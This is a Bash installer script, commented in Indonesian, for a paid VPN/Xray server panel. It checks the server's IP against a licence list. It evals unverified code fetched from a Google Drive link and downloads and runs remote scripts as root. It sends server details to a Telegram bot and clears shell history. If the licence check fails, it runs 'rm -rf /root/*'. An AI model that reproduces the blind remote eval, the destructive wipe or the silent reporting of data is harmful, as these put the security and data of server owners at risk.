#!/bin/bash
# =========================================================
# VPN Auto Installer Script
# Optimized and Recoded Edition
# =========================================================

# ---------------------------------------------------------
# 1. VARIABEL & WARNA
# ---------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

IP_FILE="/usr/bin/.ipvps"
START_TIME=$(date +%s)
# ---------------------------------------------------------
# 2. FUNGSI PEMBANTU (HELPERS)
# ---------------------------------------------------------
log_info() { echo -e "${CYAN}[INFO]${NC} ${*}"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} ${*}"; }
log_err() { echo -e "${RED}[ERROR]${NC} ${*}"; }

secs_to_human() {
    echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minutes $(( ${1} % 60 )) seconds"
}

# Fungsi Loading Bar Animasi
run_with_loading() {
    local message="$1"
    local command="$2"
    
    ( eval "$command" >/dev/null 2>&1 ) &
    local pid=$!
    
    tput civis
    echo -ne "  ${YELLOW}${message} ${NC}- ${YELLOW}[${NC}"
    while kill -0 $pid 2>/dev/null; do
        echo -ne "${GREEN}#${NC}"
        sleep 0.5
    done
    echo -e "${YELLOW}]${NC} - ${GREEN}Success!${NC}"
    tput cnorm
}

# ---------------------------------------------------------
# 3. PENGECEKAN SISTEM AWAL
# ---------------------------------------------------------
if [[ $EUID -ne 0 ]]; then
    log_err "Script ini harus dijalankan sebagai root!"
    exit 1
fi

if [[ "$(systemd-detect-virt)" == "openvz" ]]; then
    log_err "OpenVZ tidak didukung. Harap gunakan KVM."
    exit 1
fi

# Matikan IPv6
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1

# Dapatkan IP & OS
MYIP=$(curl -sS ipv4.icanhazip.com || curl -sS ifconfig.me)
echo "$MYIP" > "$IP_FILE"

if [ -f /etc/os-release ]; then
    source /etc/os-release
    OS_NAME=$PRETTY_NAME
else
    OS_NAME="Unknown OS"
fi

# ---------------------------------------------------------
# 4. PENGECEKAN LISENSI & IZIN
# ---------------------------------------------------------
CEKIP() {
    clear
    log_info "Memeriksa Lisensi IP VPS..."
    ALLOWED_IP=$(curl -sS "https://raw.githubusercontent.com/rosicenterstore/izin/main/ip" | grep -w "$MYIP" | awk '{print $4}')
    
    if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
        ID_FILE="1kIvv6I1iiSlvL6sIdYYMXJ7TcBfdodxx"
        eval "$(wget -qO- "https://drive.google.com/u/4/uc?id=${ID_FILE}")"
    else
        echo -e "${YELLOW}────────────────────────────────────────────${NC}"
        echo -e "\033[41;1m ⚠️        AKSES DI TOLAK          ⚠️ \033[0m"
        echo -e "${YELLOW}────────────────────────────────────────────${NC}"
        echo -e "        ${RED}❌ SCRIPT LOCKED ❌${NC}"
        echo -e "  ${YELLOW}🔒 Your VPS IP:${NC} $MYIP ${YELLOW}Has been Banned${NC}"
        echo -e "  ${RED}⚠️  Masa Aktif Habis atau Belum Terdaftar ⚠️${NC}"
        echo -e "  ${YELLOW}💡 Beli izin resmi hanya dari Admin!${NC}"
        echo -e "  ${GREEN}📞 Contact Admin:${NC}"
        echo -e "  ${CYAN}🌍 Telegram: https://nevpn.site${NC}"
        echo -e "  ${CYAN}📱 WhatsApp: https://whatsapp.nevpn.site${NC}"
        echo -e "${YELLOW}────────────────────────────────────────────${NC}"
        rm -rf /root/*
        exit 1
    fi
}

# ---------------------------------------------------------
# 5. SETUP AWAL (NAMA & DOMAIN)
# ---------------------------------------------------------
setup_awal() {
    clear
    mkdir -p /etc/xray /var/lib/kyt >/dev/null 2>&1
    echo "IP=" > /var/lib/kyt/ipvps.conf
    
    echo -e "${CYAN}----------------------------------------------------------${NC}"
    echo -e "  Welcome To ROSI STORE Script Installer Stable Edition "
    echo -e "     Auther : NEWBIEVPN [ KURNIAWAN SETIADI ]"
    echo -e "${CYAN}----------------------------------------------------------${NC}\n"
    
    until [[ "$name" =~ ^[a-zA-Z0-9_.-]+$ ]]; do
        read -rp "Masukan Nama Kamu (tanpa spasi): " -e name
    done
    echo "$name" > /etc/xray/username
    
    echo -e "\n${GREEN}┌──────────────────────────────────────────┐${NC}"
    echo -e "${GREEN}│ Pilih Setup Domain VPS Anda              │${NC}"
    echo -e "${GREEN}└──────────────────────────────────────────┘${NC}"
    echo -e "  [ 1 ] Domain Anda Sendiri"
    echo -e "  [ 2 ] Subdomain Random Otomatis"
    
    local choice
    until [[ "$choice" =~ ^[12]$ ]]; do
        read -rp "Pilih [1/2]: " choice
    done

    if [[ "$choice" == "1" ]]; then
        until [[ "$dnss" =~ ^[a-zA-Z0-9_.-]+$ ]]; do
            read -rp "Masukkan domain Anda: " dnss
        done
    else
        SUBDOMAIN="$(tr -dc 'a-z0-9' </dev/urandom | head -c5)"
        dnss="${SUBDOMAIN}.rosistore.biz.id"
        run_with_loading "Pointing Domain Otomatis" "wget -qO pointing.sh ${REPO}install/pointing.sh && chmod +x pointing.sh && ./pointing.sh"
    fi
    
    echo "$dnss" > /root/domain
    echo "$dnss" > /etc/xray/domain
    echo "IP=$dnss" >> /var/lib/kyt/ipvps.conf
}

# ---------------------------------------------------------
# 6. INSTALASI UTAMA
# ---------------------------------------------------------
installasi_sistem() {
    cd /root
    
    log_info "Mengunduh Tools Dasar..."
    if [[ ! -f tools.sh ]] || ! cmp -s <(wget -qO- "${REPO}tools.sh") tools.sh; then
        wget -q "${REPO}tools.sh" -O tools.sh || log_err "Gagal mengunduh tools.sh"
        chmod +x tools.sh
        ./tools.sh
    fi
    
    [[ -L /etc/localtime ]] || ln -s /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

    log_info "Memulai Instalasi Komponen VPN di OS: $OS_NAME"
    
    # Kumpulan Skrip Instalasi (Menggantikan fungsi res2 - res9 yang berulang)
    SCRIPTS=(
        "install/ssh-vpn.sh"
        "install/ins-xray.sh"
        "sshws/insshws.sh"
        "install/set-br.sh"
        "menu/update.sh"
        "slowdns/installsl.sh"
        "install/udp-custom.sh"
    )

    for script in "${SCRIPTS[@]}"; do
        script_name=$(basename "$script")
        echo -e "\n${CYAN}>>> Mengeksekusi: $script_name${NC}"
        wget -q "${REPO}${script}" -O "$script_name"
        chmod +x "$script_name"
        ./"$script_name"
    done
}

# ---------------------------------------------------------
# 7. TELEGRAM NOTIFICATION & FINISHING
# ---------------------------------------------------------
send_info_telegram() {
    local domain ISP CITY RAMMS EXP IZINC author TIME URL TEXT
    domain=$(cat /etc/xray/domain 2>/dev/null)
    ISP=$(cat /etc/xray/isp 2>/dev/null)
    CITY=$(cat /etc/xray/city 2>/dev/null)
    RAMMS=$(free -m | awk 'NR==2 {print $2}')
    TIME=$(date +'%Y-%m-%d %H:%M:%S')
    URL="https://api.telegram.org/bot${KEY}/sendMessage" # Pastikan variabel $KEY & $CHATID diekspor sebelumnya (misal dari tools.sh)
    
    IZINC=$(curl -sS "https://raw.githubusercontent.com/rosicenterstore/izin/main/ip" | grep -w "$MYIP" | awk '{print $3}')
    author=$(curl -sS "https://raw.githubusercontent.com/rosicenterstore/izin/main/ip" | grep -w "$MYIP" | awk '{print $2}')
    
    local d1=$(date -d "$IZINC" +%s 2>/dev/null || echo 0)
    local d2=$(date +%s)
    EXP=$(( (d1 - d2) / 86400 ))

    TEXT="
<code>━━━━━━━━━━━━━━━━━━━━</code>
<code>⚠️ AUTOSCRIPT PREMIUM ⚠️</code>
<code>━━━━━━━━━━━━━━━━━━━━</code>
<code>NAME : </code><code>${author}</code>
<code>TIME : </code><code>${TIME} WIB</code>
<code>DOMAIN : </code><code>${domain}</code>
<code>IP : </code><code>${MYIP}</code>
<code>ISP : </code><code>${ISP} $CITY</code>
<code>OS LINUX : </code><code>${OS_NAME}</code>
<code>RAM : </code><code>${RAMMS} MB</code>
<code>EXP SCRIPT : </code><code>$EXP Days</code>
<code>━━━━━━━━━━━━━━━━━━━━</code>
<i> Notifikasi Installer Script...</i>"

    if [[ -n "$KEY" && -n "$CHATID" ]]; then
        curl -s --max-time 10 -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" \
             -d 'reply_markup={"inline_keyboard":[[{"text":"🔥 ORDER","url":"https://t.me/FRosi46"},{"text":"🔥 GRUP","url":"https://t.me/newbielearning"}]]}' \
             "$URL" >/dev/null
    fi
}

finish_setup() {
    # Buat profile auto-verify
    cat > /root/.profile << 'END'
if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi
mesg n || true
clear
verify_login
END
    chmod 644 /root/.profile

    # Download Info Metadata
    curl -sS ifconfig.me > /etc/myipvps
    curl -s ipinfo.io/city?token=75082b4831f909 > /etc/xray/city
    curl -s ipinfo.io/org?token=75082b4831f909 | cut -d " " -f 2-10 > /etc/xray/isp

    # Cleanup File Instalasi
    rm -rf /root/izin /root/*.sh /etc/afak.conf /root/log-install.txt >/dev/null 2>&1
    history -c
    
    serverV=$(curl -sS "${REPO}versi" 2>/dev/null)
    echo "${serverV:-1.0}" > /opt/.ver
    echo "00" > /home/daily_reboot

    secs_to_human "$(( $(date +%s) - START_TIME ))" | tee -a /root/log-install.txt
}

# ---------------------------------------------------------
# EKSEKUSI UTAMA (MAIN)
# ---------------------------------------------------------
CEKIP
setup_awal
installasi_sistem
send_info_telegram
finish_setup

clear
echo -e "${GREEN}┌────────────────────────────────────────────┐${NC}"
echo -e "${GREEN}│  INSTALL SCRIPT SELESAI..                  │${NC}"
echo -e "${GREEN}└────────────────────────────────────────────┘${NC}"
sleep 3

echo -e "\n[ ${YELLOW}WARNING${NC} ] Do you want to reboot now ? (y/n)? "
read -r answer
if [[ "$answer" =~ ^[Yy]$ ]]; then
    reboot
else
    source ~/.profile
fi
